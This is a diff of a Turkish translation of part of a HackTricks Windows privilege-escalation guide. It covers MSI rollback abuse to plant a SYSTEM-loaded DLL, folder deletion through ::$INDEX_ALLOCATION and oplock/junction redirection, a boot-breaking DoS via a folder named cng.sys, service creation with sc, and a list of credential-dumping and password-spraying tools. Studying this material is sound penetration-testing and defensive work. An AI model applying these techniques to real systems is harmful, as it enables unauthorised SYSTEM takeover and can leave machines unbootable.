+Saldırı temelde Windows Installer'ın rollback özelliğinden yararlanarak meşru dosyaları kaldırma sürecinde kötü amaçlı olanlarla değiştirmeye dayanır. Bunun için saldırganın `C:\Config.Msi` klasörünü ele geçirmek amacıyla kullanılacak **kötü amaçlı bir MSI installer** oluşturması gerekir; Windows Installer daha sonra diğer MSI paketlerinin uninstall işlemleri sırasında rollback dosyalarını burada depolayacaktır ve rollback dosyaları kötü amaçlı payload içerecek şekilde değiştirilmiştir.
 
-The summarized technique is the following:
+Özet teknik şu şekildedir:
 
-1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**
+1. **Aşama 1 – Kaçırma İçin Hazırlık ( `C:\Config.Msi`'yi boş bırakın )**
 
-- Step 1: Install the MSI
-- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
-- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
-- Keep a **handle** open to the file after install.
+- Adım 1: MSI'yı yükleyin
+- Yazılabilir bir klasöre (`TARGETDIR`) zararsız bir dosya (ör. `dummy.txt`) kuran bir `.msi` oluşturun.
+- Installer'ı **"UAC Compliant"** olarak işaretleyin, böylece **non-admin user** çalıştırabilir.
+- Yüklemeden sonra dosyaya bir **handle** açık bırakın.
 
-- Step 2: Begin Uninstall
-- Uninstall the same `.msi`.
-- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
-- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.
+- Adım 2: Kaldırma İşlemini Başlatın
+- Aynı `.msi`'yı uninstall edin.
+- Uninstall süreci dosyaları `C:\Config.Msi`'ye taşımaya ve onları `.rbf` dosyalarına yeniden adlandırmaya başlar (rollback yedekleri).
+- Dosya `C:\Config.Msi\<random>.rbf` haline geldiğinde tespit etmek için `GetFinalPathNameByHandle` ile açık dosya handle'ını **poll** edin.
 
-- Step 3: Custom Syncing
-- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
-- Signals when `.rbf` has been written.
-- Then **waits** on another event before continuing the uninstall.
+- Adım 3: Özel Senkronizasyon
+- `.msi` içinde şu işi yapan bir **custom uninstall action (`SyncOnRbfWritten`)** bulunur:
+- `.rbf` yazıldığında sinyal verir.
+- Sonra uninstall'ın devam etmesinden önce başka bir event üzerinde **bekler**.
 
-- Step 4: Block Deletion of `.rbf`
-- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
-- Then **signal back** so the uninstall can finish.
-- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.
+- Adım 4: `.rbf` Silinmesini Engelle
+- Sinyal alındığında, `.rbf` dosyasını `FILE_SHARE_DELETE` olmadan **açın** — bu, dosyanın silinmesini **önler**.
+- Sonra uninstall'ın tamamlanabilmesi için **geri sinyal verin**.
+- Windows Installer `.rbf`'yi silemez ve tüm içeriği silemediği için, **`C:\Config.Msi` kaldırılmaz**.
 
-- Step 5: Manually Delete `.rbf`
-- You (attacker) delete the `.rbf` file manually.
-- Now **`C:\Config.Msi` is empty**, ready to be hijacked.
+- Adım 5: `.rbf`'yi Manuel Olarak Silin
+- Siz (saldırgan) `.rbf` dosyasını manuel olarak silin.
+- Artık **`C:\Config.Msi` boş**, ele geçirilmek üzere hazır.
 
-> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.
+> Bu noktada, `C:\Config.Msi`'yi silmek için **SYSTEM-level arbitrary folder delete vulnerability**'yi tetikleyin.
 
-2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**
+2. **Aşama 2 – Rollback Script'lerini Kötü Amaçlı Olanlarla Değiştirme**
 
-- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
-- Recreate the `C:\Config.Msi` folder yourself.
-- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.
+- Adım 6: Zayıf ACL'lerle `C:\Config.Msi`'yi Yeniden Oluştur
+- `C:\Config.Msi` klasörünü kendiniz yeniden oluşturun.
+- **Zayıf DACL'ler** (ör. Everyone:F) ayarlayın ve `WRITE_DAC` ile bir handle açık tutun.
 
-- Step 7: Run Another Install
-- Install the `.msi` again, with:
-- `TARGETDIR`: Writable location.
-- `ERROROUT`: A variable that triggers a forced failure.
-- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.
+- Adım 7: Başka Bir Kurulum Çalıştırın
+- `.msi`'yı tekrar kurun, şularla:
+- `TARGETDIR`: Yazılabilir konum.
+- `ERROROUT`: zorunlu bir failure tetikleyecek bir değişken.
+- Bu kurulum tekrar **rollback** tetikleyecek ve `.rbs` ve `.rbf` okunacaktır.
 
-- Step 8: Monitor for `.rbs`
-- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
-- Capture its filename.
+- Adım 8: `.rbs`'i İzleyin
+- `ReadDirectoryChangesW` kullanarak `C:\Config.Msi`'yi yeni bir `.rbs` oluşana kadar izleyin.
+- Dosya adını yakalayın.
 
-- Step 9: Sync Before Rollback
-- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
-- Signals an event when the `.rbs` is created.
-- Then **waits** before continuing.
+- Adım 9: Rollback Öncesi Senkronizasyon
+- `.msi` içinde şu işi yapan bir **custom install action (`SyncBeforeRollback`)** bulunur:
+- `.rbs` oluşturulduğunda bir event ile sinyal verir.
+- Sonra devam etmeden önce **bekler**.
 
-- Step 10: Reapply Weak ACL
-- After receiving the `.rbs created` event:
-- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
-- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.
+- Adım 10: Zayıf ACL'yi Yeniden Uygula
+- `.rbs oluşturuldu` event'ini aldıktan sonra:
+- Windows Installer `C:\Config.Msi`'ye **güçlü ACL'ler** uygular.
+- Ancak siz hala `WRITE_DAC` ile bir handle'a sahip olduğunuz için **yine zayıf ACL'ler** uygulayabilirsiniz.
 
-> ACLs are **only enforced on handle open**, so you can still write to the folder.
+> ACL'ler **sadece handle açıldığında** uygulanır, bu yüzden klasöre yazmaya devam edebilirsiniz.
 
-- Step 11: Drop Fake `.rbs` and `.rbf`
-- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
-- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
-- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.
+- Adım 11: Sahte `.rbs` ve `.rbf` Bırak
+- `.rbs` dosyasını, Windows'a şunu söyleyen **sahte bir rollback script** ile overwrite edin:
+- `.rbf` dosyanızı (kötü amaçlı DLL) bir **ayrıcalıklı konuma** geri yüklemesini (örn. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`) söyleyin.
+- Kötü amaçlı SYSTEM-seviyeli payload DLL içeren sahte `.rbf`'yi bırakın.
 
-- Step 12: Trigger the Rollback
-- Signal the sync event so the installer resumes.
-- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
-- This causes **rollback to begin**.
+- Adım 12: Rollback'i Tetikle
+- Installer'ın devam etmesi için sync event'ini sinyalleyin.
+- Bilinen bir noktada kurulumu **bilerek başarısız** kılmak için yapılandırılmış bir **type 19 custom action (`ErrorOut`)** vardır.
+- Bu, **rollback'in başlamasına** neden olur.
 
-- Step 13: SYSTEM Installs Your DLL
+- Adım 13: SYSTEM DLL'inizi Yükler
 - Windows Installer:
-- Reads your malicious `.rbs`.
-- Copies your `.rbf` DLL into the target location.
-- You now have your **malicious DLL in a SYSTEM-loaded path**.
+- Kötü amaçlı `.rbs`'inizi okur.
+- Kötü amaçlı `.rbf` DLL'inizi hedef konuma kopyalar.
+- Artık **SYSTEM tarafından yüklenen bir yolda kötü amaçlı DLL**'iniz var.
 
-- Final Step: Execute SYSTEM Code
-- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
-- **Boom**: Your code is executed **as SYSTEM**.
+- Son Adım: SYSTEM Kodunu Çalıştır
+- DLL'i yükleyecek güvenilir bir **auto-elevated binary** (ör. `osk.exe`) çalıştırın.
+- **Patlama**: Kodunuz **SYSTEM olarak** çalıştırılır.
 
 
 ### From Arbitrary File Delete/Move/Rename to SYSTEM EoP
 
-The main MSI rollback technique (the previous one) assumes you can delete an **entire folder** (e.g., `C:\Config.Msi`). But what if your vulnerability only allows **arbitrary file deletion** ?
+Ana MSI rollback tekniği (öncekiler) tüm bir klasörü (ör. `C:\Config.Msi`) silebildiğinizi varsayar. Peki ya zafiyetiniz sadece **keyfi dosya silme**ye izin veriyorsa?
 
-You could exploit **NTFS internals**: every folder has a hidden alternate data stream called:
+NTFS içyapılarını suistimal edebilirsiniz: her klasörün şu adla gizli bir alternate data stream'i vardır:
 ```
 C:\SomeFolder::$INDEX_ALLOCATION
 ```
-Bu akış klasörün **dizin meta verisini** depolar.
+Bu stream, klasörün **index metadata** bilgisini depolar.
 
-Dolayısıyla, bir klasörün **`::$INDEX_ALLOCATION` akışını silerseniz**, NTFS dosya sisteminden **tüm klasörü kaldırır**.
+Dolayısıyla, bir klasörün **`::$INDEX_ALLOCATION` stream'ini silerseniz**, NTFS dosya sisteminden **tüm klasörü kaldırır**.
 
-Bunu şu gibi standart dosya silme API'leri kullanarak yapabilirsiniz:
+Bunu standart dosya silme API'lerini kullanarak yapabilirsiniz, örneğin:
 ```c
 DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
 ```
-> *dosya* silme API'sini çağırıyor olsanız bile, klasörün kendisini **siler**.
+> Her ne kadar *file* delete API çağırıyor olsanız da, bu **klasörün kendisini siler**.
 
-### Klasör İçeriğinin Silinmesinden SYSTEM EoP'ye
-Primitive'iniz rastgele dosya/klasör silmenize izin vermiyorsa, fakat saldırgan kontrollü bir klasörün *içeriğinin* silinmesine **izin veriyorsa** ne olur?
+### From Folder Contents Delete to SYSTEM EoP
+Primitive'iniz rastgele dosya/klasörleri silmenize izin vermiyorsa, ancak **attacker-controlled folder'ın *contents*'unu silmenize izin veriyorsa** ne olur?
 
-1. Adım 1: Tuzak bir klasör ve dosya oluşturun
+1. Step 1: Tuzak klasör ve dosya oluşturma
 - Oluştur: `C:\temp\folder1`
-- İçinde: `C:\temp\folder1\file1.txt`
+- İçine: `C:\temp\folder1\file1.txt`
 
-2. Adım 2: `file1.txt` üzerinde bir **oplock** yerleştirin
-- Bir yetkili süreç `file1.txt`'i silmeye çalıştığında oplock yürütmeyi **duraklatır**.
+2. Step 2: `file1.txt` üzerinde bir **oplock** yerleştirin
+- Oplock, yetkili bir süreç `file1.txt`'i silmeye çalıştığında yürütmeyi **duraklatır**.
 ```c
 // pseudo-code
 RequestOplock("C:\\temp\\folder1\\file1.txt");
 WaitForDeleteToTriggerOplock();
 ```
-3. Adım 3: SYSTEM sürecini tetikleyin (örn., `SilentCleanup`)
-- Bu süreç klasörleri tarar (örn., `%TEMP%`) ve içlerini silmeye çalışır.
+3. Adım 3: SYSTEM sürecini tetikleyin (ör. `SilentCleanup`)
+- Bu süreç klasörleri (ör. `%TEMP%`) tarar ve içindekileri silmeye çalışır.
 - `file1.txt`'e ulaştığında, **oplock tetiklenir** ve kontrol callback'inize geçer.
 
-4. Adım 4: Oplock callback'i içinde – silme işlemini yönlendirin
+4. Adım 4: oplock callback içinde – silmeyi yönlendirin
 
 - Seçenek A: `file1.txt`'i başka bir yere taşıyın
 - Bu, `folder1`'i oplock'u bozmadan boşaltır.
-- `file1.txt`'i doğrudan silmeyin — bu, oplock'un zamanından önce serbest kalmasına neden olur.
+- `file1.txt`'i doğrudan silmeyin — bu, oplock'u erken serbest bırakır.
 
 - Seçenek B: `folder1`'i bir **junction**'a dönüştürün:
 ```bash
 # folder1 is now a junction to \RPC Control (non-filesystem namespace)
 mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
 ```
-- Seçenek C: `\RPC Control` içinde bir **symlink** oluşturun:
+- Seçenek C: `\RPC Control` içinde bir **symlink** oluştur:
 ```bash
 # Make file1.txt point to a sensitive folder stream
 CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
 ```
 > Bu, klasör meta verilerini depolayan NTFS iç akışını hedef alır — onu silmek klasörü siler.
 
-5. Adım 5: Oplock'u serbest bırak
-- SYSTEM işlemi devam eder ve `file1.txt` dosyasını silmeye çalışır.
-- Ama şimdi, junction + symlink nedeniyle, aslında şu şeyi siliyor:
+5. Adım 5: oplock'u serbest bırak
+- SYSTEM işlemi devam eder ve `file1.txt`'i silmeye çalışır.
+- Ancak şimdi, junction + symlink nedeniyle, aslında şu an siliyor:
 ```
 C:\Config.Msi::$INDEX_ALLOCATION
 ```
@@ -1514,35 +1542,35 @@ C:\Config.Msi::$INDEX_ALLOCATION
 
 ### From Arbitrary Folder Create to Permanent DoS
 
-Sizi **create an arbitrary folder as SYSTEM/admin** yapmaya izin veren bir primitive'yi istismar edin — hatta **dosya yazamıyorsanız** veya **zayıf izinler ayarlayamıyorsanız** bile.
+Bir primitive'i suistimal edin; bu size **create an arbitrary folder as SYSTEM/admin** oluşturma imkânı verir — hatta **dosyalara yazamıyor** veya **zayıf izinler ayarlayamıyor** olsanız bile.
 
-Bir **klasör** (dosya değil) oluşturun; adına bir **kritik Windows sürücüsü** koyun, örn.:
+Bir **klasör** (dosya değil) oluşturun; adı bir **kritik Windows sürücüsü** olan, e.g.:
 ```
 C:\Windows\System32\cng.sys
 ```
-- Bu yol genellikle `cng.sys` çekirdek mod sürücüsüne karşılık gelir.
-- Eğer bunu **önceden bir klasör olarak oluşturursanız**, Windows önyüklemede gerçek sürücüyü yükleyemez.
-- Sonra, Windows önyükleme sırasında `cng.sys`'i yüklemeye çalışır.
-- Klasörü görür, **gerçek sürücüyü çözümleyemez**, ve **çöker veya önyüklemeyi durdurur**.
-- Harici müdahale olmadan (ör. önyükleme onarımı veya disk erişimi) **yedek yol** veya **kurtarma** yoktur.
+- Bu yol genelde `cng.sys` çekirdek modu sürücüsüne karşılık gelir.
+- Eğer bunu **bir klasör olarak önceden oluşturursanız**, Windows önyüklemede gerçek sürücüyü yükleyemez.
+- Ardından, Windows önyükleme sırasında `cng.sys`'i yüklemeye çalışır.
+- Klasörü görür, **gerçek sürücüyü çözemeyerek başarısız olur** ve **çöker veya önyüklemeyi durdurur**.
+- Harici müdahale olmadan (ör. önyükleme onarımı veya disk erişimi) **geri dönüş yok** ve **kurtarma mümkün değil**.
 
 
 ## **High Integrity'den SYSTEM'e**
 
 ### **Yeni servis**
 
-Zaten High Integrity bir işlem üzerinde çalışıyorsanız, **SYSTEM'e giden yol** sadece **yeni bir servis oluşturup çalıştırmak** kadar kolay olabilir:
+Eğer zaten bir High Integrity süreci üzerinde çalışıyorsanız, **SYSTEM'e giden yol** sadece **yeni bir servis oluşturup çalıştırmak** kadar kolay olabilir:
 ```
 sc create newservicename binPath= "C:\windows\system32\notepad.exe"
 sc start newservicename
 ```
 > [!TIP]
-> Bir service binary oluştururken bunun geçerli bir service olduğundan ya da ikili dosyanın gerekli işlemleri hızlıca gerçekleştirdiğinden emin olun; geçerli bir service değilse 20s içinde sonlandırılacaktır.
+> Service binary oluştururken bunun geçerli bir service olduğundan veya ikili dosyanın gerekli eylemleri gerçekleştirdiğinden emin olun; aksi takdirde geçerli bir service değilse 20s içinde sonlandırılacaktır.
 
 ### AlwaysInstallElevated
 
-From a High Integrity process you could try to **enable the AlwaysInstallElevated registry entries** and **install** a reverse shell using a _**.msi**_ wrapper.\
-[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)
+High Integrity bir process üzerinden **AlwaysInstallElevated registry entries**'ı etkinleştirmeyi ve bir _**.msi**_ wrapper kullanarak bir reverse shell **kurmayı** deneyebilirsiniz.\
+[Konu olan registry anahtarları ve bir _.msi_ paketinin nasıl kurulacağı hakkında daha fazla bilgi için buraya bakın.](#alwaysinstallelevated)
 
 ### High + SeImpersonate privilege to System
 
@@ -1550,20 +1578,20 @@ From a High Integrity process you could try to **enable the AlwaysInstallElevate
 
 ### From SeDebug + SeImpersonate to Full Token privileges
 
-If you have those token privileges (probably you will find this in an already High Integrity process), you will be able to **open almost any process** (not protected processes) with the SeDebug privilege, **copy the token** of the process, and create an **arbitrary process with that token**.\
-Using this technique is usually **selected any process running as SYSTEM with all the token privileges** (_yes, you can find SYSTEM processes without all the token privileges_).\
-**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**
+Eğer bu token ayrıcalıklarına sahipseniz (muhtemelen zaten High Integrity bir process içinde bulacaksınız), SeDebug ayrıcalığı ile **neredeyse herhangi bir process'i açabilir** (protected process değil), process'in **token'ını kopyalayabilir** ve o token ile **rastgele bir process oluşturabilirsiniz**.\
+Bu teknik genellikle **tüm token ayrıcalıklarına sahip SYSTEM olarak çalışan bir process'in seçilmesiyle** kullanılır (_evet, tüm token ayrıcalıklarına sahip olmayan SYSTEM process'leri bulabilirsiniz_).\
+**Bir örnek kodu** [**buradan bulabilirsiniz**](sedebug-+-seimpersonate-copy-token.md)**.**
 
 ### **Named Pipes**
 
-This technique is used by meterpreter to escalate in `getsystem`. The technique consists on **creating a pipe and then create/abuse a service to write on that pipe**. Then, the **server** that created the pipe using the **`SeImpersonate`** privilege will be able to **impersonate the token** of the pipe client (the service) obtaining SYSTEM privileges.\
-If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
-If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).
+Bu teknik meterpreter tarafından getsystem yükseltmesi için kullanılır. Teknik, **bir pipe oluşturup sonra o pipe'a yazmak için bir service oluşturma/istismar etme** işlemine dayanır. Ardından, pipe'ı **`SeImpersonate`** ayrıcalığıyla oluşturan **server**, pipe istemcisinin (service'in) token'ını **taklit ederek** SYSTEM ayrıcalıkları elde edebilir.\
+Eğer [**named pipes hakkında daha fazla bilgi edinmek isterseniz, burayı okuyun**](#named-pipe-client-impersonation).\
+Named pipes kullanarak high integrity'den System'e nasıl geçileceğine dair bir örnek okumak isterseniz [**burayı okuyun**](from-high-integrity-to-system-with-name-pipes.md).
 
 ### Dll Hijacking
 
-If you manages to **hijack a dll** being **loaded** by a **process** running as **SYSTEM** you will be able to execute arbitrary code with those permissions. Therefore Dll Hijacking is also useful to this kind of privilege escalation, and, moreover, if far **more easy to achieve from a high integrity process** as it will have **write permissions** on the folders used to load dlls.\
-**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**
+SYSTEM olarak çalışan bir **process** tarafından **yüklenen** bir **dll'i** hijack etmeyi başarırsanız, bu izinlerle keyfi kod çalıştırabilirsiniz. Bu yüzden Dll Hijacking bu tür privilege escalation için de yararlıdır ve ayrıca high integrity bir process'ten ulaşılması **çok daha kolaydır**, çünkü dll'lerin yüklendiği klasörler üzerinde **write permissions** olacaktır.\
+**Daha fazla bilgi için** [**Dll hijacking hakkında buraya bakın**](dll-hijacking/index.html)**.**
 
 ### **From Administrator or Network Service to System**
 
@@ -1573,57 +1601,57 @@ If you manages to **hijack a dll** being **loaded** by a **process** running as 
 
 ### From LOCAL SERVICE or NETWORK SERVICE to full privs
 
-**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)
+**Oku:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)
 
-## More help
+## Daha fazla yardım
 
 [Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)
 
-## Useful tools
+## Faydalı araçlar
 
-**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
+**Windows local privilege escalation vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
 
 **PS**
 
 [**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
-[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Yanlış yapılandırmaları ve hassas dosyaları kontrol et (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Tespit edildi.**\
-[**JAWS**](https://github.com/411Hall/JAWS) **-- Olası yanlış yapılandırmaları kontrol et ve bilgi topla (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
-[**privesc** ](https://github.com/enjoiz/Privesc)**-- Yanlış yapılandırmaları kontrol et**\
-[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP kaydedilmiş oturum bilgilerini çıkarır. Localde -Thorough kullanın.**\
+[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Yanlış yapılandırmaları ve hassas dosyaları kontrol eder (**[**buraya bakın**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Tespit edildi.**\
+[**JAWS**](https://github.com/411Hall/JAWS) **-- Bazı olası yanlış yapılandırmaları kontrol eder ve bilgi toplar (**[**buraya bakın**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
+[**privesc** ](https://github.com/enjoiz/Privesc)**-- Yanlış yapılandırmaları kontrol eder**\
+[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP kaydedilmiş oturum bilgilerini çıkarır. Yerelde -Thorough kullanın.**\
 [**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager'dan kimlik bilgilerini çıkarır. Tespit edildi.**\
-[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Toplanan parolaları domain üzerinde spray yapar**\
-[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer ve man-in-the-middle aracı.**\
-[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel privesc Windows enumeration**\
-[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Bilinen privesc zafiyetlerini ara (Watson için DEPRECATED)\
-[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokal kontroller **(Admin hakları gerekli)**
+[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Toplanan parolaları domain genelinde spray eder**\
+[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh, PowerShell tabanlı bir ADIDNS/LLMNR/mDNS/NBNS spoofer ve man-in-the-middle aracıdır.**\
+[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel privesc Windows keşfi**\
+[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Bilinen privesc zafiyetlerini arar (DEPRECATED for Watson)\
+[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Yerel kontroller **(Yönetici hakları gerekir)**
 
 **Exe**
 
-[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen privesc zafiyetlerini ara (VisualStudio ile derlenmesi gerekir) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
-[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Yanlış yapılandırmaları arayarak hostu enumerate eder (daha çok bilgi toplama aracı, privesc'ten çok) (derlenmesi gerekir) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
-[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Birçok yazılımdan kimlik bilgilerini çıkarır (github'da precompiled exe)**\
+[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen privesc zafiyetlerini arar (VisualStudio kullanılarak derlenmesi gerekir) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
+[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Yanlış yapılandırmaları arayarak host'ta bilgi toplar (privesc'den ziyade bilgi toplama aracı) (derlenmesi gerekir) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
+[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Birçok yazılımdan kimlik bilgilerini çıkarır (github'da önceden derlenmiş exe)**\
 [**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp'ın C# portu**\
-[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Yanlış yapılandırmaları kontrol et (github'da executable precompiled). Önerilmez. Win10'da iyi çalışmıyor.\
-[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Olası yanlış yapılandırmaları kontrol et (python'dan exe). Önerilmez. Win10'da iyi çalışmıyor.
+[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Yanlış yapılandırmaları kontrol eder (çalıştırılabilir github'da önceden derlenmiş). Önerilmez. Win10'da iyi çalışmaz.\
+[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Olası yanlış yapılandırmaları kontrol eder (python'dan exe). Önerilmez. Win10'da iyi çalışmaz.
 
 **Bat**
 
-[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu gönderiye dayanarak oluşturulmuş araç (accesschk olmadan da çalışır ama kullanabilir).
+[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu gönderiye dayanarak oluşturulmuş araç (doğru çalışması için accesschk'e ihtiyaç yoktur, ancak kullanabilir).
 
 **Local**
 
-[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okuyup çalışabilecek exploitleri önerir (local python)\
-[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okuyup çalışabilecek exploitleri önerir (local python)
+[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okuyup çalışacak exploitleri önerir (yerel python)\
+[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okuyup çalışacak exploitleri önerir (yerel python)
 
 **Meterpreter**
 
-_multi/recon/local_exploit_suggestor_
+multi/recon/local_exploit_suggestor_
 
-Projeyi doğru .NET sürümünü kullanarak derlemeniz gerekir ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Kurulu .NET sürümünü hedef makinede görmek için şunu yapabilirsiniz:
+Projeyi doğru .NET sürümü ile derlemeniz gerekir ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Kurban makinadaki yüklü .NET sürümünü görmek için şunu yapabilirsiniz:
 ```
 C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
 ```
-## Kaynaklar
+## Referanslar
 
 - [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
 - [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
@@ -1641,5 +1669,7 @@ C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)
 
 - [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
+
+- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
 
 {{#include ../../banners/hacktricks-training.md}}
